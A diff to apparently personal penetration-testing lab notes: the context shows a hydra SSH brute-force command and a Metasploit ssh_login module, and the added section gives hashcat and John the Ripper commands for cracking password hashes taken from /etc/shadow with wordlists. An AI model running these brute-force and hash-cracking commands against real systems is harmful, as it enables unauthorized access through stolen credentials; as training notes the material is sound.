@@ -21,3 +21,13 @@ hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://192.194.185.3 -f
 ```
 scanner/ssh/ssh_login module
 ```
+
+#### Crack /etc/hashes With hahcat and John
+```
+/etc/login.defs >> Check Hashing Algorithm
+
+hashcat -m 1800 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt --force
+
+john /etc/shadow --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt
+
+```
